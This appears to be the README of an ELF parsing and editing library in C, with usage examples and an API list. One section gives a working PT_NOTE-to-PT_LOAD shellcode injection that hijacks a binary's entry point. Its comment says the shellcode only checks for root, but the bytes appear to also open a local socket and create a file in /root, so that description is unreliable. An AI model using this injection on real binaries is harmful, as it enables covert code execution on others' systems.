# Ælfred

An elf parsing/editing library.

This simply wraps a bunch of elf-oriented tasks I do frequently into library functions.

# Examples

Some examples:

## Open And Prepare An Elf For Parsing/Editing

```c
elf_bin_t* elf = open_elf("./path/to/file");;
```

## Read And Reference Program Headers

```
elf_bin_t* elf = open_elf("./path/to/file");

print_program_headers(elf);

Elf64_Phdr p = elf->phdr[3];
printf("Value of the 'p_vaddr' field in the 4th program header: %016llx\n", p.p_vaddr);
```

The `print_*` functions included with Ælfred are just examples that are intended to
be used if you don't care or don't need a specific format of the output. They are not 
formatted in a pretty or easily readable way, especially if there are several 
program or sections headers. 

## Edit The Third Program Header

```
elf_bin_t* elf = open_elf("./path/to/file");

Elf64_Word new_val = 0xffffff;
set_phdr_flags(elf, 3, new_val);

dump_elf(elf);
```

The set functions hold your changes in the elf_bin_t struct's `bin` field. To
write the changes to disk, you must call `dump_elf`. By default, the output file 
is named `elf.out`. This can be changed in the library files.

## Edit A Binary 

In this example, assume your target is a simple "Hello, World!" program and you 
know in advance that the string "Hello, World!" is stored at offset 0x2004 in your 
target.

```
elf_bin_t* elf = open_elf("./path/to/file");

unsigned long long len = 12;
unsigned char* bytes = calloc(1, len);
memcpy(bytes, "Goodbye, all", len);
update_binary(elf, bytes, len, 0x2004, 0);

dump_elf(elf);
```

The output binary should now print "Goodbye, all!".

## A More Complex Example

The following example demonstrates how quickly you can edit and create an elf with
various changes that still works as expected. In this example, we do a simple
PT_NOTE->PT_LOAD shellcode injection. 

There is some invisible complexity here, in that you must have some knowledge of 
how the technique works to explain why some of the changes are required. A simple 
web search should explain this, but I will try to add some comments to make the 
invisible steps more visible

```
/*
 * Shellcode that checks if the program is being run as UID 0 
 * and then jumps back to the original entry point. 
 */
unsigned char sc[] = {
  0x49, 0x89, 0xe4, 0x48, 0x31, 0xc0, 0xb8, 0x66, 0x00, 0x00, 0x00, 0x0f,
  0x05, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x05, 0xe9, 0x97, 0x00, 0x00, 0x00,
  0xe8, 0x0e, 0x00, 0x00, 0x00, 0x79, 0x6f, 0x75, 0x20, 0x41, 0x52, 0x45,
  0x20, 0x72, 0x6f, 0x6f, 0x74, 0x0a, 0x00, 0x48, 0x31, 0xc0, 0x48, 0x31,
  0xd2, 0xfe, 0xc0, 0x48, 0x89, 0xc7, 0x5e, 0xb2, 0x0d, 0x0f, 0x05, 0xbf,
  0x02, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2,
  0xb8, 0x29, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x89, 0xc6, 0x4c, 0x89,
  0xf7, 0x48, 0x31, 0xc0, 0x50, 0x41, 0xbd, 0x7f, 0x00, 0x00, 0x01, 0x44,
  0x89, 0x6c, 0x24, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0xfa, 0x1f, 0x90, 0x4d,
  0x31, 0xed, 0x41, 0xb5, 0x02, 0x66, 0x44, 0x89, 0x6c, 0x24, 0xf8, 0x48,
  0x83, 0xec, 0x08, 0x48, 0x89, 0xe6, 0xba, 0x10, 0x00, 0x00, 0x00, 0xb8,
  0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x57, 0x48, 0xbf,
  0x2f, 0x72, 0x6f, 0x6f, 0x74, 0x2f, 0x2e, 0x7a, 0x57, 0x48, 0x89, 0xe7,
  0xbe, 0x42, 0x00, 0x00, 0x00, 0xba, 0xb6, 0x01, 0x00, 0x00, 0xb8, 0x02,
  0x00, 0x00, 0x00, 0x0f, 0x05, 0xeb, 0x29, 0xe8, 0x12, 0x00, 0x00, 0x00,
  0x79, 0x6f, 0x75, 0x20, 0x61, 0x72, 0x65, 0x20, 0x4e, 0x4f, 0x54, 0x20,
  0x72, 0x6f, 0x6f, 0x74, 0x0a, 0x00, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2,
  0xfe, 0xc0, 0x48, 0x89, 0xc7, 0x5e, 0xb2, 0x11, 0x0f, 0x05, 0xeb, 0x00,
  0x4c, 0x89, 0xe4, 0x48, 0x31, 0xd2, 0xe8, 0x2d, 0x00, 0x00, 0x00, 0x49,
  0xb9, 0xde, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0xba, 0x38,
  0x41, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x49, 0xbb, 0x60, 0x10, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x29, 0xc8, 0x48, 0x83, 0xe8, 0x05,
  0x4c, 0x29, 0xd0, 0x4c, 0x01, 0xd8, 0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24,
  0xc3
};
unsigned int sc_len = 295;

elf_bin_t* elf = open_elf(target_elf);
int note = 0;
for (int i = 0; i < elf->hdr->e_phnum; i++) {
  if (elf->phdr[i].p_type == PT_NOTE) {        // Find the first NOTE header
    note = i;
    break;
  }
}
note++; // Increment since we don't use offsets in our set functions

set_phdr_type(elf, note, PT_LOAD);     // Change the NOTE to a LOAD header
set_phdr_flags(elf, note, 5);          // Update the permissions (5 == R-X)
set_phdr_offset(elf, note, elf->size); // Set the offset to the end of the elf file
set_phdr_filesz(elf, note, sc_len);    // Set sizes to length of shell code
set_phdr_memsz(elf, note, sc_len);

/*
 * This change is more complex to explain, but, essentially,
 * we need a virtual address that will be out of the way of 
 * everything after we are loaded.
 */
set_phdr_vaddr(elf, note, 0xc00000000 + elf->size);

set_hdr_entry(elf, 0xc00000000 + elf->size); // Change elf entry point to be the LOAD

/*
 * This concatenates the shellcode to the end of the binary. You 
 * could technically write it to any code cave, but this will work.
 * Also, update_binary will edit the elf->size field in this example, 
 * so you must run this last or store the original size if you need it.
 */
update_binary(elf, sc, sc_len, elf->size, 0);

dump_elf(elf); // Write to disk
```

So, effectively -- if you don't count the shellcode, comments, and spacing --
we are able to do a PT_NOTE->PT_LOAD injection in fewer than 20 lines of code.

# Available Methods

```
/*
 * Utilities
 */
int get_ehdr_type(int type, char*type_str);
int get_phdr_type(int, char*);
int get_phdr_perms(int perms, char* perms_str);
int get_shdr_type(int type, char* type_str);
int find_section(elf_bin_t* elf, unsigned long long offset, int* sec_offset);
elf_bin_t* open_elf(const char* target_elf);
int dump_elf(elf_bin_t* elf);
/*
 * Parsers
 */
static int parse_header(elf_bin_t* elf);
static int parse_program_headers(elf_bin_t* elf);
static int parse_section_headers(elf_bin_t* elf);
static int parse_sections(elf_bin_t* elf);
static int parse_elf(elf_bin_t* elf);
/*
 * Setters
 */
int update_section(elf_bin_t* elf, unsigned char* bytes, unsigned long long len, unsigned int section, unsigned long long offset);
int update_binary(elf_bin_t* elf, unsigned char* bytes, unsigned long long len, unsigned long long offset, int extend);
//hdr
void set_hdr_type(elf_bin_t* elf, Elf64_Half new_val);
void set_hdr_machine(elf_bin_t* elf, Elf64_Half new_val);
void set_hdr_version(elf_bin_t* elf, Elf64_Word new_val);
void set_hdr_entry(elf_bin_t* elf, Elf64_Addr new_val);
void set_hdr_phoff(elf_bin_t* elf, Elf64_Off new_val);
void set_hdr_shoff(elf_bin_t* elf, Elf64_Off new_val);
void set_hdr_flags(elf_bin_t* elf, Elf64_Word new_val);
void set_hdr_ehsize(elf_bin_t* elf, Elf64_Half new_val);
void set_hdr_phentsize(elf_bin_t* elf, Elf64_Half new_val);
void set_hdr_phnum(elf_bin_t* elf, Elf64_Half new_val);
void set_hdr_shentsize(elf_bin_t* elf, Elf64_Half new_val);
void set_hdr_shnum(elf_bin_t* elf, Elf64_Half new_val);
void set_hdr_shstrndx(elf_bin_t* elf, Elf64_Half new_val);
// phdrs
int set_phdr_align(elf_bin_t* elf, unsigned int phdr, Elf64_Xword new_val);
int set_phdr_memsz(elf_bin_t* elf, unsigned int phdr, Elf64_Xword new_val);
int set_phdr_filesz(elf_bin_t* elf, unsigned int phdr, Elf64_Xword new_val);
int set_phdr_paddr(elf_bin_t* elf, unsigned int phdr, Elf64_Addr new_val);
int set_phdr_vaddr(elf_bin_t* elf, unsigned int phdr, Elf64_Addr new_val);
int set_phdr_flags(elf_bin_t* elf, unsigned int phdr, Elf64_Word new_val);
int set_phdr_type(elf_bin_t* elf, unsigned int phdr, Elf64_Word new_val);
int set_phdr_offset(elf_bin_t* elf, unsigned int phdr, Elf64_Off new_val);
//shdrs
int set_shdr_name(elf_bin_t* elf, unsigned int shdr, Elf64_Word new_val);
int set_shdr_type(elf_bin_t* elf, unsigned int shdr, Elf64_Word new_val);
int set_shdr_flags(elf_bin_t* elf, unsigned int shdr, Elf64_Xword new_val);
int set_shdr_addr(elf_bin_t* elf, unsigned int shdr, Elf64_Addr new_val);
int set_shdr_offset(elf_bin_t* elf, unsigned int shdr, Elf64_Off new_val);
int set_shdr_size(elf_bin_t* elf, unsigned int shdr, Elf64_Xword new_val);
int set_shdr_link(elf_bin_t* elf, unsigned int shdr, Elf64_Word new_val);
int set_shdr_info(elf_bin_t* elf, unsigned int shdr, Elf64_Word new_val);
int set_shdr_addralign(elf_bin_t* elf, unsigned int shdr, Elf64_Xword new_val);
int set_shdr_entsize(elf_bin_t* elf, unsigned int shdr, Elf64_Xword new_val);
/*
 * Printers
 */
int print_elf_header(elf_bin_t*);
int print_program_headers(elf_bin_t*);
int print_section_headers(elf_bin_t*);
```
